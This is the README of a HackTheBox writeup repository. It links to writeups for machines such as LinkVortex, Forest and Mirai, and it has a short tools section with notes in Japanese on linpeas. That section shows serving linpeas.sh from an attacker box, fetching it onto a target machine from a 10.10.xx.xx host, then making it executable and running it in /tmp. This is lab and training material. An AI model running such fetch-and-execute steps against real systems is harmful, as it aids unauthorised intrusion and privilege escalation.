# HackTheBox-writeups
HackTheBox machine writeups


## LinkVortex

https://github.com/s1f102201672/HackTheBox-writeup/tree/main/LinkVortex

## Instant

https://github.com/s1f102201672/HackTheBox-writeup/tree/main/Instant


## BoardLight

https://github.com/s1f102201672/HackTheBox-writeup/tree/main/BoardLight


## Forest

https://github.com/s1f102201672/HackTheBox-writeup/tree/main/Forest


## Cap

https://github.com/s1f102201672/HackTheBox-writeup/tree/main/Cap


## Strutted

https://github.com/s1f102201672/HackTheBox-writeup/tree/main/Strutted


## Cicada

https://github.com/s1f102201672/HackTheBox-writeup/tree/main/Cicada


## Mirai

https://github.com/s1f102201672/HackTheBox-writeup/tree/main/Mirai




# Tools
## linpeas
home/kaliにインストール

```
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```

/home/kali送る側
```
python3 -m http.server 8080
```

ターゲットマシンで受け取る
```
cd /tmp
wget http://10.10.xx.xx/linpeas.sh -O linpeas.sh
xx:/tmp$ ls
linpeas.sh

xx:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh

./linpeas.sh
xx:/tmp$ ./linpeas.sh | tee linpeas_output.txt
```
